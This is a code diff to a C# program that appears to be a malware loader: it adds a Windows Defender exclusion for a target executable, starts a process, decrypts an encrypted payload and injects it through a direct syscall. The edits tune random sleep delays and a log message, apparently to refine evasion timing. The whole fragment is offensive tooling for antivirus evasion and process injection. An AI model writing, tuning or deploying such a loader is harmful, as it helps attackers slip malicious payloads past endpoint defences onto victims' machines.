@@ -51,14 +51,14 @@ class Program
             {
                 Console.WriteLine("[*] Attempting to add Defender exclusion...");
                 AddDefenderExclusion(target + ".exe");
-                Console.WriteLine("[+] Defender exclusion added.");
+                Console.WriteLine("[+] Defender exclusion added !.");
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[!] Skipped Defender exclusion: " + ex.Message);
             }
 
-            RandomSleep(1000, 3000);
+            RandomSleep(4000, 5000);
 
             var proc = StartProcess(target);
             if (proc == null)
@@ -68,13 +68,11 @@ class Program
             }
             Console.WriteLine($"[+] Started process: {proc.Id}");
 
-            RandomSleep(1000, 2500);
+            RandomSleep(2000, 3000);
 
             Console.WriteLine("[*] Decrypting payload...");
             byte[] decrypted = DecryptPayload(encrypted, key);
             Console.WriteLine("[+] Decryption complete");
-
-            RandomSleep(500, 1500);
 
             Console.WriteLine("[*] Injecting payload...");
             InjectViaSyscall(proc.Id, decrypted);
